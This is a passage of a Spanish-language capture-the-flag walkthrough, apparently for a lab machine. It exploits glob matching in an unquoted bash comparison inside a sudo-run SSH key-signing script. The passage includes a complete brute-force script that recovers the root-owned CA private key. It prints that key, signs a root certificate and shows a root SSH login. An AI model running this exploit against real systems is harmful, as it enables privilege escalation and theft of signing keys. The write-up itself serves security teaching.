+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="co">#!/bin/bash</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true"></a><span class="fu">usage ()</span> <span class="kw">{</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Usage: </span><span class="va">$0</span><span class="st"> &lt;ca_file&gt; &lt;public_key_file&gt; &lt;username&gt; &lt;principal&gt; &lt;serial&gt;&quot;</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true"></a>    <span class="bu">exit</span> 1</span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true"></a><span class="kw">}</span></span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true"></a></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="st">&quot;</span><span class="va">$#</span><span class="st">&quot;</span> <span class="ot">-ne</span> 5<span class="bu"> ]</span>; <span class="kw">then</span></span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true"></a></span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true"></a><span class="va">ca_file=</span><span class="st">&quot;</span><span class="va">$1</span><span class="st">&quot;</span></span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true"></a><span class="va">public_key_file=</span><span class="st">&quot;</span><span class="va">$2</span><span class="st">&quot;</span></span>
+<span id="cb21-15"><a href="#cb21-15" aria-hidden="true"></a><span class="va">username=</span><span class="st">&quot;</span><span class="va">$3</span><span class="st">&quot;</span></span>
+<span id="cb21-16"><a href="#cb21-16" aria-hidden="true"></a><span class="va">principal_str=</span><span class="st">&quot;</span><span class="va">$4</span><span class="st">&quot;</span></span>
+<span id="cb21-17"><a href="#cb21-17" aria-hidden="true"></a><span class="va">serial=</span><span class="st">&quot;</span><span class="va">$5</span><span class="st">&quot;</span></span>
+<span id="cb21-18"><a href="#cb21-18" aria-hidden="true"></a></span>
+<span id="cb21-19"><a href="#cb21-19" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="ot">!</span> <span class="ot">-f</span> <span class="st">&quot;</span><span class="va">$ca_file</span><span class="st">&quot;</span><span class="bu"> ]</span>; <span class="kw">then</span></span>
+<span id="cb21-20"><a href="#cb21-20" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: CA file &#39;</span><span class="va">$ca_file</span><span class="st">&#39; not found.&quot;</span></span>
+<span id="cb21-21"><a href="#cb21-21" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb21-22"><a href="#cb21-22" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb21-23"><a href="#cb21-23" aria-hidden="true"></a></span>
+<span id="cb21-24"><a href="#cb21-24" aria-hidden="true"></a><span class="va">itca=$(</span><span class="fu">cat</span> /etc/ssh/ca-it<span class="va">)</span></span>
+<span id="cb21-25"><a href="#cb21-25" aria-hidden="true"></a><span class="va">ca=$(</span><span class="fu">cat</span> <span class="st">&quot;</span><span class="va">$ca_file</span><span class="st">&quot;</span><span class="va">)</span></span>
+<span id="cb21-26"><a href="#cb21-26" aria-hidden="true"></a><span class="kw">if [[</span> <span class="va">$itca</span> <span class="ot">==</span> <span class="va">$ca</span><span class="kw"> ]]</span>; <span class="kw">then</span></span>
+<span id="cb21-27"><a href="#cb21-27" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: Use API for signing with this CA.&quot;</span></span>
+<span id="cb21-28"><a href="#cb21-28" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb21-29"><a href="#cb21-29" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb21-30"><a href="#cb21-30" aria-hidden="true"></a></span>
+<span id="cb21-31"><a href="#cb21-31" aria-hidden="true"></a><span class="kw">if</span><span class="bu"> [</span> <span class="ot">!</span> <span class="ot">-f</span> <span class="st">&quot;</span><span class="va">$public_key_file</span><span class="st">&quot;</span><span class="bu"> ]</span>; <span class="kw">then</span></span>
+<span id="cb21-32"><a href="#cb21-32" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: Public key file &#39;</span><span class="va">$public_key_file</span><span class="st">&#39; not found.&quot;</span></span>
+<span id="cb21-33"><a href="#cb21-33" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb21-34"><a href="#cb21-34" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb21-35"><a href="#cb21-35" aria-hidden="true"></a></span>
+<span id="cb21-36"><a href="#cb21-36" aria-hidden="true"></a><span class="va">supported_principals=</span><span class="st">&quot;webserver,analytics,support,security&quot;</span></span>
+<span id="cb21-37"><a href="#cb21-37" aria-hidden="true"></a><span class="va">IFS=</span><span class="st">&#39;,&#39;</span> <span class="bu">read</span> -ra <span class="va">principal</span> <span class="op">&lt;&lt;&lt;</span> <span class="st">&quot;</span><span class="va">$principal_str</span><span class="st">&quot;</span></span>
+<span id="cb21-38"><a href="#cb21-38" aria-hidden="true"></a><span class="kw">for</span> <span class="ex">word</span> in <span class="st">&quot;</span><span class="va">${principal[@]}</span><span class="st">&quot;</span><span class="kw">;</span> <span class="kw">do</span></span>
+<span id="cb21-39"><a href="#cb21-39" aria-hidden="true"></a>    <span class="kw">if</span> ! <span class="bu">echo</span> <span class="st">&quot;</span><span class="va">$supported_principals</span><span class="st">&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> -qw <span class="st">&quot;</span><span class="va">$word</span><span class="st">&quot;</span><span class="kw">;</span> <span class="kw">then</span></span>
+<span id="cb21-40"><a href="#cb21-40" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;Error: &#39;</span><span class="va">$word</span><span class="st">&#39; is not a supported principal.&quot;</span></span>
+<span id="cb21-41"><a href="#cb21-41" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;Choose from:&quot;</span></span>
+<span id="cb21-42"><a href="#cb21-42" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    webserver - external web servers - webadmin user&quot;</span></span>
+<span id="cb21-43"><a href="#cb21-43" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    analytics - analytics team databases - analytics user&quot;</span></span>
+<span id="cb21-44"><a href="#cb21-44" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    support - IT support server - support user&quot;</span></span>
+<span id="cb21-45"><a href="#cb21-45" aria-hidden="true"></a>        <span class="bu">echo</span> <span class="st">&quot;    security - SOC servers - support user&quot;</span></span>
+<span id="cb21-46"><a href="#cb21-46" aria-hidden="true"></a>        <span class="bu">echo</span></span>
+<span id="cb21-47"><a href="#cb21-47" aria-hidden="true"></a>        <span class="ex">usage</span></span>
+<span id="cb21-48"><a href="#cb21-48" aria-hidden="true"></a>    <span class="kw">fi</span></span>
+<span id="cb21-49"><a href="#cb21-49" aria-hidden="true"></a><span class="kw">done</span></span>
+<span id="cb21-50"><a href="#cb21-50" aria-hidden="true"></a></span>
+<span id="cb21-51"><a href="#cb21-51" aria-hidden="true"></a><span class="kw">if</span> !<span class="kw"> [[</span> <span class="va">$serial</span> =~ ^[0-9]+$<span class="kw"> ]]</span>; <span class="kw">then</span></span>
+<span id="cb21-52"><a href="#cb21-52" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: &#39;</span><span class="va">$serial</span><span class="st">&#39; is not a number.&quot;</span></span>
+<span id="cb21-53"><a href="#cb21-53" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb21-54"><a href="#cb21-54" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb21-55"><a href="#cb21-55" aria-hidden="true"></a></span>
+<span id="cb21-56"><a href="#cb21-56" aria-hidden="true"></a><span class="fu">ssh-keygen</span> -s <span class="st">&quot;</span><span class="va">$ca_file</span><span class="st">&quot;</span> -z <span class="st">&quot;</span><span class="va">$serial</span><span class="st">&quot;</span> -I <span class="st">&quot;</span><span class="va">$username</span><span class="st">&quot;</span> -V -1w:forever -n <span class="st">&quot;</span><span class="va">$principal</span><span class="st">&quot;</span> <span class="st">&quot;</span><span class="va">$public_key_file</span><span class="st">&quot;</span></span>
+<span id="cb21-57"><a href="#cb21-57" aria-hidden="true"></a></span>
+<span id="cb21-58"><a href="#cb21-58" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Si miramos esta parte de código, podemos observar que esta comparando la clave privada de la entidad certificadora <strong>/etc/ssh/ca-it</strong> con la clave privada que el usuario envía y en caso de que sean iguales, el script mostrara el mensaje <strong>Error: Use API for signing with this CA.</strong></p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a><span class="va">itca=$(</span><span class="fu">cat</span> /etc/ssh/ca-it<span class="va">)</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a><span class="va">ca=$(</span><span class="fu">cat</span> <span class="st">&quot;</span><span class="va">$ca_file</span><span class="st">&quot;</span><span class="va">)</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true"></a><span class="kw">if [[</span> <span class="va">$itca</span> <span class="ot">==</span> <span class="va">$ca</span><span class="kw"> ]]</span>; <span class="kw">then</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: Use API for signing with this CA.&quot;</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true"></a>    <span class="ex">usage</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true"></a><span class="kw">fi</span></span></code></pre></div>
+<p>Pero nosotros no tenemos los permisos necesarios para poder ver el contenido de dicha clave privada</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ls -l /etc/ssh/ca-it</span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true"></a><span class="ex">-rw-------</span> 1 root root 432 Feb  8  2024 /etc/ssh/ca-it</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Copiamos ese trozo de código para realizar una prueba</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat test.sh </span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a><span class="co">#!/usr/bin/bash</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a><span class="va">ca_file=$1</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true"></a></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true"></a><span class="va">itca=$(</span><span class="fu">cat</span> /home/zzinter/key_origin<span class="va">)</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true"></a><span class="va">ca=$(</span><span class="fu">cat</span> <span class="st">&quot;</span><span class="va">$ca_file</span><span class="st">&quot;</span><span class="va">)</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true"></a><span class="kw">if [[</span> <span class="va">$itca</span> <span class="ot">==</span> <span class="va">$ca</span><span class="kw"> ]]</span>; <span class="kw">then</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true"></a>    <span class="bu">echo</span> <span class="st">&quot;Error: Use API for signing with this CA.&quot;</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true"></a><span class="kw">fi</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>En este caso vamos a comparar el archivo <strong>key_origin</strong> con el archivo que enviará el usuario, en este caso <strong>new_key</strong> .</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat key_origin </span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a><span class="ex">klhasdgklgy</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat new_key </span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a><span class="ex">qwetawsdgsy</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>De primeras parecería que los 2 archivos no son iguales, y es cierto ya que al ejecutar el script, no recibo ningún mensaje.</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ./test.sh new_key</span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Pero si ahora, en el archivo <strong>new_key</strong> le añadimos un asterisco <strong>*</strong> resulta que ahora el contenido de los 2 archivos si son iguales.</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat key_origin </span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true"></a><span class="ex">klhasdgklgy</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat new_key </span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true"></a><span class="ex">*y</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ./test.sh new_key</span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true"></a><span class="ex">Error</span>: Use API for signing with this CA.</span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Esto es debido a que al indicarle un asterisco, le estamos diciendo que hay contenido, y que después de ese contenido, termina con la letra <strong>y</strong>, pues lo mismo que con el contenido de <strong>key_origin</strong> empieza por contenido, y termina con la letra <strong>y</strong> .</p>
+<p>Pues jugando con este concepto podríamos averiguar la clave privada de la autoridad certificadora (CA) mediante fuerza bruta.</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true"></a><span class="co">#!/bin/bash  </span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true"></a>  </span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true"></a><span class="va">characters=</span><span class="st">&#39;-=+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/ !&#39;</span>  </span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true"></a><span class="va">key=</span><span class="st">&quot;&quot;</span>  </span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true"></a></span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true"></a></span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true"></a><span class="kw">while</span> <span class="fu">true</span><span class="kw">;</span> <span class="kw">do</span>  </span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true"></a>      </span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true"></a>    <span class="fu">cp</span> new_key new_key2  </span>
+<span id="cb28-10"><a href="#cb28-10" aria-hidden="true"></a>  </span>
+<span id="cb28-11"><a href="#cb28-11" aria-hidden="true"></a>    <span class="kw">for</span> <span class="kw">((</span> x=0; x&lt;<span class="va">${#characters}</span>; x++ <span class="kw">))</span>; <span class="kw">do</span>  </span>
+<span id="cb28-12"><a href="#cb28-12" aria-hidden="true"></a>  </span>
+<span id="cb28-13"><a href="#cb28-13" aria-hidden="true"></a>        <span class="va">char=</span><span class="st">&quot;</span><span class="va">${characters:$x:1}</span><span class="st">&quot;</span>  </span>
+<span id="cb28-14"><a href="#cb28-14" aria-hidden="true"></a>  </span>
+<span id="cb28-15"><a href="#cb28-15" aria-hidden="true"></a>        <span class="kw">if [[</span> <span class="va">$char</span> <span class="ot">==</span> <span class="st">&quot;!&quot;</span><span class="kw"> ]]</span>; <span class="kw">then</span>  </span>
+<span id="cb28-16"><a href="#cb28-16" aria-hidden="true"></a>            <span class="va">char=</span><span class="st">&quot;\n&quot;</span>  </span>
+<span id="cb28-17"><a href="#cb28-17" aria-hidden="true"></a>        <span class="kw">fi</span>  </span>
+<span id="cb28-18"><a href="#cb28-18" aria-hidden="true"></a>  </span>
+<span id="cb28-19"><a href="#cb28-19" aria-hidden="true"></a>        <span class="bu">echo</span> -e <span class="st">&quot;*</span><span class="va">$char$key</span><span class="st">&quot;</span> <span class="op">&gt;</span> new_key  </span>
+<span id="cb28-20"><a href="#cb28-20" aria-hidden="true"></a>  </span>
+<span id="cb28-21"><a href="#cb28-21" aria-hidden="true"></a>        <span class="fu">sudo</span> /opt/sign_key.sh new_key test_id root test 1 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;API&quot;</span> <span class="op">1&gt;</span>/dev/null  </span>
+<span id="cb28-22"><a href="#cb28-22" aria-hidden="true"></a>  </span>
+<span id="cb28-23"><a href="#cb28-23" aria-hidden="true"></a>        <span class="kw">if [[</span> <span class="va">$?</span> <span class="ot">-eq</span> 0<span class="kw"> ]]</span>; <span class="kw">then</span>  </span>
+<span id="cb28-24"><a href="#cb28-24" aria-hidden="true"></a>            <span class="va">key=</span><span class="st">&quot;</span><span class="va">${char}${key}</span><span class="st">&quot;</span>  </span>
+<span id="cb28-25"><a href="#cb28-25" aria-hidden="true"></a>            <span class="bu">break</span>  </span>
+<span id="cb28-26"><a href="#cb28-26" aria-hidden="true"></a>        <span class="kw">fi</span>  </span>
+<span id="cb28-27"><a href="#cb28-27" aria-hidden="true"></a>  </span>
+<span id="cb28-28"><a href="#cb28-28" aria-hidden="true"></a>    <span class="kw">done</span>  </span>
+<span id="cb28-29"><a href="#cb28-29" aria-hidden="true"></a>  </span>
+<span id="cb28-30"><a href="#cb28-30" aria-hidden="true"></a>    <span class="bu">echo</span> -e <span class="st">&quot;</span><span class="va">$key</span><span class="st">&quot;</span> <span class="op">&gt;</span> new_key  </span>
+<span id="cb28-31"><a href="#cb28-31" aria-hidden="true"></a>  </span>
+<span id="cb28-32"><a href="#cb28-32" aria-hidden="true"></a>    <span class="fu">diff</span> new_key new_key2 <span class="op">1&gt;</span>/dev/null  </span>
+<span id="cb28-33"><a href="#cb28-33" aria-hidden="true"></a>  </span>
+<span id="cb28-34"><a href="#cb28-34" aria-hidden="true"></a>    <span class="kw">if [[</span> <span class="va">$?</span> <span class="ot">-eq</span> 0<span class="kw"> ]]</span>; <span class="kw">then</span>  </span>
+<span id="cb28-35"><a href="#cb28-35" aria-hidden="true"></a>        <span class="bu">break</span>  </span>
+<span id="cb28-36"><a href="#cb28-36" aria-hidden="true"></a>    <span class="kw">fi</span>  </span>
+<span id="cb28-37"><a href="#cb28-37" aria-hidden="true"></a>  </span>
+<span id="cb28-38"><a href="#cb28-38" aria-hidden="true"></a><span class="kw">done</span>  </span>
+<span id="cb28-39"><a href="#cb28-39" aria-hidden="true"></a>  </span>
+<span id="cb28-40"><a href="#cb28-40" aria-hidden="true"></a><span class="fu">rm</span> new_key2  </span>
+<span id="cb28-41"><a href="#cb28-41" aria-hidden="true"></a>  </span>
+<span id="cb28-42"><a href="#cb28-42" aria-hidden="true"></a><span class="fu">mv</span> new_key key_cert</span></code></pre></div>
+<p>Ejecutamos el script y al esperar un tiempo, nos crea la clave privada de la entidad certificadora.</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ./bruteforce_key.sh</span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ cat key_cert </span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true"></a><span class="ex">-----BEGIN</span> OPENSSH PRIVATE KEY-----</span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true"></a><span class="ex">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true"></a><span class="ex">QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true"></a><span class="ex">rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ</span></span>
+<span id="cb29-7"><a href="#cb29-7" aria-hidden="true"></a><span class="ex">AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA</span></span>
+<span id="cb29-8"><a href="#cb29-8" aria-hidden="true"></a><span class="ex">cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV</span></span>
+<span id="cb29-9"><a href="#cb29-9" aria-hidden="true"></a><span class="va">QBAgM=</span></span>
+<span id="cb29-10"><a href="#cb29-10" aria-hidden="true"></a><span class="ex">-----END</span> OPENSSH PRIVATE KEY-----</span>
+<span id="cb29-11"><a href="#cb29-11" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Con la clave privada ya obtenida, podemos crear el certificado que utilizaremos para poder luego acceder como el usuario <strong>root</strong> .</p>
+<p>Creamos la clave SSH.</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ssh-keygen</span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a><span class="ex">Generating</span> public/private rsa key pair.</span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true"></a><span class="ex">Enter</span> file in which to save the key (/home/zzinter/.ssh/id_rsa)<span class="bu">:</span> </span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true"></a><span class="ex">Created</span> directory <span class="st">&#39;/home/zzinter/.ssh&#39;</span>.</span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true"></a><span class="ex">Enter</span> passphrase (empty for no passphrase)<span class="bu">:</span> </span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true"></a><span class="ex">Enter</span> same passphrase again: </span>
+<span id="cb30-7"><a href="#cb30-7" aria-hidden="true"></a><span class="ex">Your</span> identification has been saved in /home/zzinter/.ssh/id_rsa</span>
+<span id="cb30-8"><a href="#cb30-8" aria-hidden="true"></a><span class="ex">Your</span> public key has been saved in /home/zzinter/.ssh/id_rsa.pub</span>
+<span id="cb30-9"><a href="#cb30-9" aria-hidden="true"></a><span class="ex">The</span> key fingerprint is:</span>
+<span id="cb30-10"><a href="#cb30-10" aria-hidden="true"></a><span class="ex">SHA256</span>:CRluuFDYuIbp2BPUQZ4Q7O+bCJPliVhqLyITz1DqMEs zzinter@ssg</span>
+<span id="cb30-11"><a href="#cb30-11" aria-hidden="true"></a><span class="ex">The</span> key<span class="st">&#39;s randomart image is:</span></span>
+<span id="cb30-12"><a href="#cb30-12" aria-hidden="true"></a><span class="st">+---[RSA 3072]----+</span></span>
+<span id="cb30-13"><a href="#cb30-13" aria-hidden="true"></a><span class="st">| .oB+..          |</span></span>
+<span id="cb30-14"><a href="#cb30-14" aria-hidden="true"></a><span class="st">|  =+o+ o         |</span></span>
+<span id="cb30-15"><a href="#cb30-15" aria-hidden="true"></a><span class="st">| =..+ =          |</span></span>
+<span id="cb30-16"><a href="#cb30-16" aria-hidden="true"></a><span class="st">|o *. o . .       |</span></span>
+<span id="cb30-17"><a href="#cb30-17" aria-hidden="true"></a><span class="st">|o=oo.   S        |</span></span>
+<span id="cb30-18"><a href="#cb30-18" aria-hidden="true"></a><span class="st">|OEo..            |</span></span>
+<span id="cb30-19"><a href="#cb30-19" aria-hidden="true"></a><span class="st">|@Ooo             |</span></span>
+<span id="cb30-20"><a href="#cb30-20" aria-hidden="true"></a><span class="st">|*=+...           |</span></span>
+<span id="cb30-21"><a href="#cb30-21" aria-hidden="true"></a><span class="st">|o.o.o.           |</span></span>
+<span id="cb30-22"><a href="#cb30-22" aria-hidden="true"></a><span class="st">+----[SHA256]-----+</span></span>
+<span id="cb30-23"><a href="#cb30-23" aria-hidden="true"></a><span class="st">zzinter@ssg:~$ </span></span></code></pre></div>
+<p>Creamos el certificado.</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ chmod 600 key_cert </span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ssh-keygen -s key_cert -n root_user -I anything .ssh/id_rsa.pub</span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true"></a><span class="ex">Signed</span> user key .ssh/id_rsa-cert.pub: id <span class="st">&quot;anything&quot;</span> serial 0 for root_user valid forever</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ls -l .ssh/</span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true"></a><span class="ex">total</span> 12</span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true"></a><span class="ex">-rw-------</span> 1 zzinter zzinter 2602 Feb  9 12:41 id_rsa</span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 zzinter zzinter 1118 Feb  9 12:44 id_rsa-cert.pub</span>
+<span id="cb31-8"><a href="#cb31-8" aria-hidden="true"></a><span class="ex">-rw-r--r--</span> 1 zzinter zzinter  565 Feb  9 12:41 id_rsa.pub</span>
+<span id="cb31-9"><a href="#cb31-9" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ </span></code></pre></div>
+<p>Ya finalmente podemos acceder como el usuario <strong>root</strong> .</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true"></a><span class="ex">zzinter@ssg</span>:~$ ssh -o CertificateFile=.ssh/id_rsa-cert.pub -i .ssh/id_rsa root@localhost -p 2222</span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true"></a><span class="ex">The</span> authenticity of host <span class="st">&#39;[localhost]:2222 ([127.0.0.1]:2222)&#39;</span> can<span class="st">&#39;t be established.</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true"></a><span class="st">ED25519 key fingerprint is SHA256:tOsmHdA7xDQq2UDyCf0EobZ/LcitevFrAQ6RSJCy10Q.</span></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true"></a><span class="st">This key is not known by any other names</span></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true"></a><span class="st">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true"></a><span class="st">Warning: Permanently added &#39;</span>[localhost]:2222<span class="st">&#39; (ED25519) to the list of known hosts.</span></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true"></a><span class="st">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)</span></span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true"></a></span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true"></a><span class="st"> * Documentation:  https://help.ubuntu.com</span></span>
+<span id="cb32-10"><a href="#cb32-10" aria-hidden="true"></a><span class="st"> * Management:     https://landscape.canonical.com</span></span>
+<span id="cb32-11"><a href="#cb32-11" aria-hidden="true"></a><span class="st"> * Support:        https://ubuntu.com/pro</span></span>
+<span id="cb32-12"><a href="#cb32-12" aria-hidden="true"></a></span>
+<span id="cb32-13"><a href="#cb32-13" aria-hidden="true"></a><span class="st"> System information as of Sun Feb  9 12:47:17 PM UTC 2025</span></span>
+<span id="cb32-14"><a href="#cb32-14" aria-hidden="true"></a></span>
+<span id="cb32-15"><a href="#cb32-15" aria-hidden="true"></a><span class="st">  System load:  0.0                Processes:             246</span></span>
+<span id="cb32-16"><a href="#cb32-16" aria-hidden="true"></a><span class="st">  Usage of /:   88.1% of 10.73GB   Users logged in:       1</span></span>
+<span id="cb32-17"><a href="#cb32-17" aria-hidden="true"></a><span class="st">  Memory usage: 13%                IPv4 address for eth0: 10.10.11.27</span></span>
+<span id="cb32-18"><a href="#cb32-18" aria-hidden="true"></a><span class="st">  Swap usage:   0%</span></span>
+<span id="cb32-19"><a href="#cb32-19" aria-hidden="true"></a></span>
